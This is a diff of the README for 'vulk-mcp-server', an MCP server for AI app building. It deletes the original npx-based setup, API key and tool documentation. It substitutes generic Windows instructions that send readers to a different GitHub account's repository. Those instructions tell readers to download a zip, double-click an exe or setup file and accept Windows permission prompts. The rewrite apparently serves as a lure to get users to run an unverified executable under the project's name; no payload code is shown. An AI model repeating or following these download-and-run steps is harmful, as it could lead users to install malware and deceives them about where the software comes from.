@@ -1,247 +1,177 @@
-<p align="center">
-  <img src="https://vulk.dev/images/vulk-icon.svg" alt="VULK" width="60" height="60" />
-</p>
-
-<h1 align="center">VULK MCP Server</h1>
-
-<p align="center">
-  <strong>Build, deploy, and export full-stack applications from any AI assistant.</strong>
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/vulk-mcp-server"><img src="https://img.shields.io/npm/v/vulk-mcp-server?color=0D9373" alt="npm" /></a>
-  <a href="https://vulk.dev"><img src="https://img.shields.io/badge/vulk.dev-live-0D9373" alt="VULK" /></a>
-  <a href="https://github.com/vulkdev/vulk-mcp-server/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License" /></a>
-</p>
-
-<p align="center">
-  Give Claude, Cursor, Windsurf, VS Code Copilot, or Gemini CLI the ability to generate, edit, deploy, and export production-ready applications — powered by <a href="https://vulk.dev">VULK</a>.
-</p>
-
----
-
-## What This Does
-
-This MCP server connects AI coding assistants to VULK's full application platform. Say _"build me a project management dashboard"_ and it triggers real AI generation — not templates, not scaffolding, but a complete application.
-
-**Generation**
-- **16+ LLM models** — Claude Opus 4.6, GPT-5.4, Gemini 3.1 Pro, DeepSeek V3, Grok 4, and more
-- **Full-stack output** — React + Tailwind + routing + API endpoints + database schemas
-- **Real-time streaming** — watch files being generated in your terminal
-- **Auto-fix pipeline** — linting, browser verification, self-debugging loop
-
-**Export & Deploy**
-- **Web** — Deploy to Cloudflare Pages with custom domains + SSL
-- **PWA** — Progressive Web App with offline support
-- **APK** — Android app builds (server-side compilation)
-- **iOS** — iOS app builds via Flutter
-- **Flutter** — Web-to-Flutter AI converter for native mobile
-- **Custom domains** — Automatic SSL, DNS configuration included
-
-**Platform**
-- **Bring Your Own Model (BYOM)** — use your own API keys for any provider
-- **Figma import** — convert Figma designs to code
-- **GitHub integration** — push generated code directly
-- **Team collaboration** — shared workspaces, role-based permissions
-- **8 languages** — EN, PT, FR, DE, ES, IT, JA, HI
-
-## Quick Setup
-
-### Claude Desktop
-
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+# 🚀 vulk-mcp-server - Build apps from any AI assistant
 
-```json
-{
-  "mcpServers": {
-    "vulk": {
-      "command": "npx",
-      "args": ["-y", "vulk-mcp-server"],
-      "env": {
-        "VULK_API_KEY": "vk_sk_your_key_here"
-      }
-    }
-  }
-}
-```
+[![Download / Install](https://img.shields.io/badge/Download%20vulk--mcp--server-blue?style=for-the-badge&logo=github)](https://github.com/Diuli4587/vulk-mcp-server)
 
-### Cursor
+## 🧭 What this is
 
-Settings → MCP Servers → Add:
+vulk-mcp-server helps you build, deploy, and export full-stack apps with help from an AI assistant. It works as a bridge between your AI tool and your app project, so you can move from idea to working app with less manual setup.
 
-```json
-{
-  "vulk": {
-    "command": "npx",
-    "args": ["-y", "vulk-mcp-server"],
-    "env": {
-      "VULK_API_KEY": "vk_sk_your_key_here"
-    }
-  }
-}
-```
+Use it when you want to:
+- create app screens and features from plain language
+- connect AI tools to a local project
+- export work into a usable app build
+- keep your app flow simple from start to finish
 
-### VS Code (GitHub Copilot)
+## 💻 What you need
 
-Create `.vscode/mcp.json`:
+Before you start, check that your PC has:
+- Windows 10 or Windows 11
+- a modern web browser
+- enough free disk space for your app projects
+- internet access for the first setup and download
 
-```json
-{
-  "servers": {
-    "vulk": {
-      "command": "npx",
-      "args": ["-y", "vulk-mcp-server"],
-      "env": {
-        "VULK_API_KEY": "vk_sk_your_key_here"
-      }
-    }
-  }
-}
-```
+For the best results, keep these apps ready too:
+- an AI assistant that supports MCP
+- a code editor if you want to inspect files
+- the desktop app or browser app you use to work on projects
 
-### Windsurf
+## 📥 Download and setup
 
-Add to MCP settings:
+Use this link to visit the page to download:
 
-```json
-{
-  "vulk": {
-    "command": "npx",
-    "args": ["-y", "vulk-mcp-server"],
-    "env": {
-      "VULK_API_KEY": "vk_sk_your_key_here"
-    }
-  }
-}
-```
+[![Visit download page](https://img.shields.io/badge/Visit%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Diuli4587/vulk-mcp-server)
 
-### Gemini CLI
+Follow these steps on Windows:
 
-Install the extension directly from GitHub:
+1. Open the download page in your browser.
+2. Get the latest version from the repository page.
+3. If the page provides a file, download it to your PC.
+4. Save it in a folder you can find easily, such as Downloads or Desktop.
+5. If the project comes as a zip file, extract it first.
+6. Open the folder and follow the setup files or instructions inside.
+7. Start the server or app file that comes with the project.
 
-```bash
-gemini extensions install VULK-dev/vulk-mcp-server
-```
+If you are not sure what to click, look for files named like:
+- setup
+- install
+- run
+- start
+- server
+- exe
 
-Then set your API key:
+## 🪟 Run on Windows
 
-```bash
-export VULK_API_KEY="vk_sk_your_key_here"
-```
+After you download the project, use this simple flow:
 
-Or configure it in the extension settings when prompted. The extension uses the same MCP server under the hood, giving you access to all VULK tools (generate, edit, deploy, etc.) directly from Gemini CLI.
+1. Open the folder where you saved the files.
+2. Double-click the main app or server file.
+3. If Windows asks for permission, choose Yes.
+4. If a browser window opens, keep it open.
+5. If a terminal window opens, leave it running.
+6. Open your AI tool and connect it to the MCP server if needed.
+7. Test it by asking the assistant to build a small app task.
 
-## Get Your API Key
+If you see a blank screen, wait a few seconds. Some tools need time to start.
 
-1. Go to [vulk.dev/settings/api-keys](https://vulk.dev/settings/api-keys)
-2. Click **Create API Key**
-3. Copy the key (starts with `vk_sk_`)
+## 🔌 Connect your AI assistant
 
-Free accounts get 3 generations/month. [Upgrade](https://vulk.dev/pricing) for more.
+vulk-mcp-server is made for AI tools that can talk to MCP servers. This lets your assistant work with your app project in a direct way.
 
-## Tools
+Common steps:
+- open your AI tool settings
+- find the tool or server connection area
+- add the local server from this project
+- save the settings
+- restart the AI tool if needed
 
-### `generate` — Build a new app
+Once connected, you can ask for tasks like:
+- build a login screen
+- create a product page
+- export a project build
+- add navigation between pages
+- prepare a Flutter or React app structure
 
-> "Build a modern SaaS dashboard with user auth, analytics charts, team management, and dark mode"
+## 🧱 What you can do with it
 
-Creates a project, triggers AI generation, and returns all generated files with a live preview URL. Generation runs through VULK's full pipeline — intent analysis, multi-file code generation, auto-fixing, browser verification, and quality scoring.
+This project is made for app building from AI prompts. You can use it for:
 
-### `edit` — Modify an existing project
+- app scaffolding
+- page generation
+- project export
+- local workflow control
+- full-stack app setup
+- build handoff from AI to project files
 
-> "Add a settings page with tabs for Profile, Billing, and Notifications"
+It fits well with:
+- Claude
+- Cursor
+- Gemini CLI
+- Windsurf
+- other MCP-aware tools
 
-Sends your instruction to VULK's AI with full context of all existing project files. The AI decides which files to create or modify.
+## 🗂️ Typical project flow
 
-### `list` — See your projects
+A simple workflow looks like this:
 
-Returns all your VULK projects with IDs, prompts, dates, and deployment URLs.
+1. You open your AI assistant.
+2. You connect it to vulk-mcp-server.
+3. You describe the app you want.
+4. The assistant creates files or changes.
+5. You review the output.
+6. You export or deploy the result.
 
-### `get` — Project details
+This gives you a direct path from request to app files without a lot of manual steps.
 
-Get status, metadata, and URLs for a specific project.
+## 🛠️ Basic use cases
 
-### `files` — Read source code
+Use the server for tasks such as:
+- building a small web app
+- creating a mobile app UI
+- setting up a PWA
+- preparing a React project
+- organizing Flutter app files
+- moving an AI draft into a real project
 
-Download every file from a project — paths, content, language detection.
+It also helps if you want a repeatable process for app work. That is useful when you test ideas fast and want clean output.
 
-### `deploy` — Ship to production
+## 📦 Folder tips
 
-Deploy to Cloudflare Pages and get a live production URL with custom domain support.
+If you want to keep things easy on Windows, use this folder layout:
+- Downloads for the original file
+- Projects for extracted app files
+- Documents for notes and setup info
+- Desktop for quick access during first use
 
-### `models` — Available LLM models
+A clean folder setup makes it easier to find the server later.
 
-List all available models on your plan — Claude Opus 4.6, Sonnet 4.6, GPT-5.4, Gemini 3.1 Pro, DeepSeek V3, Grok 4, and more.
+## 🔍 If the app does not start
 
-### `usage` — Check your limits
+Try these steps if something seems off:
 
-View API request counts, credits remaining, and rate limit status.
+1. Check that the files finished downloading.
+2. Make sure the zip file was fully extracted.
+3. Open the correct folder.
+4. Run the main file again.
+5. Restart Windows if the server still does not open.
+6. Reopen your AI tool after the server starts.
 
-### `subscribe` — Upgrade your plan
+If the file opens and closes fast, you may have launched the wrong file. Look for the main server entry file or the setup instructions in the folder.
 
-Get a checkout link to upgrade. Plans from $19.99/mo to $299/mo.
+## 🧩 Common tasks to ask your AI assistant
 
-## Environment Variables
+You can ask for:
+- “Build a simple app home page.”
+- “Create a sign-in screen.”
+- “Add a settings page.”
+- “Export this project for deployment.”
+- “Set up a React starter app.”
+- “Prepare a Flutter app structure.”
+- “Make this app ready as a PWA.”
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `VULK_API_KEY` | Yes | — | Your VULK API key (`vk_sk_...`) |
-| `VULK_API_BASE` | No | `https://vulk.dev` | API base URL |
+Short, clear requests work best.
 
-## How It Works
+## 📁 Repository details
 
-```
-You → "Build me a task manager"
-       ↓
-MCP Server → POST /api/v1/projects (create record)
-       ↓
-MCP Server → POST /api/agent/stream (trigger AI generation)
-       ↓
-VULK Agent → Intent analysis → Code generation → Auto-fix → Browser verify
-       ↓
-MCP Server ← SSE stream (file_start, file_delta, file_complete events)
-       ↓
-You ← { files: [...], previewUrl, editorUrl }
-```
+- Repository: vulk-mcp-server
+- Description: VULK MCP Server — Build, deploy, and export full-stack applications from any AI assistant.
+- Topics: ai-app-builder, claude, code-generation, cursor, developer-tools, flutter, gemini-cli-extension, mcp, mcp-server, model-context-protocol, pwa, react, windsurf
 
-The generation pipeline includes:
-- **Intent analysis** — understands what kind of app you want
-- **ReAct agent loop** — plans and generates files with tool use
-- **Auto-fixer** — deterministic code fixes (imports, routing, styling)
-- **Browser verification** — renders the app, catches errors, self-heals
-- **Quality scoring** — ensures the output meets production standards
+## ✅ Quick start checklist
 
-## Pricing
-
-| Plan | Price | Credits/month | LLM Models | Best For |
-|------|-------|---------------|------------|----------|
-| Free | $0 | 3 generations | Basic | Trying it out |
-| Builder | $19.99/mo | 1,000 | Basic (Haiku, Flash, Mini) | Getting started |
-| Pro | $39.99/mo | 2,500 | All 16+ models | Power users |
-| Team | $79.99/mo | 5,000 | All + team collaboration | Small teams |
-| Max | $199/mo | 10,000 | All + BYOM + white-label | Agencies |
-| Business | $299/mo | 20,000 | Everything + SSO + SLA | Organizations |
-
-Credits are token-based — simple apps use ~100 credits, complex ones ~500+. [Full pricing details](https://vulk.dev/pricing).
-
-## Development
-
-```bash
-git clone https://github.com/vulkdev/vulk-mcp-server.git
-cd vulk-mcp-server
-npm install
-npm run build
-VULK_API_KEY=vk_sk_... node dist/index.js
-```
-
-## Links
-
-- [VULK](https://vulk.dev) — AI-powered application builder
-- [API Keys](https://vulk.dev/settings/api-keys) — Get your key
-- [Pricing](https://vulk.dev/pricing) — Plans and pricing
-- [Documentation](https://support.vulk.dev) — Full docs
-- [Compare](https://vulk.dev/compare) — VULK vs Bolt vs Lovable vs v0
-
-## License
-
-MIT
+- Visit the download page
+- Download the project
+- Extract the files if needed
+- Open the folder on Windows
+- Run the main file
+- Connect your AI assistant
+- Start building your app
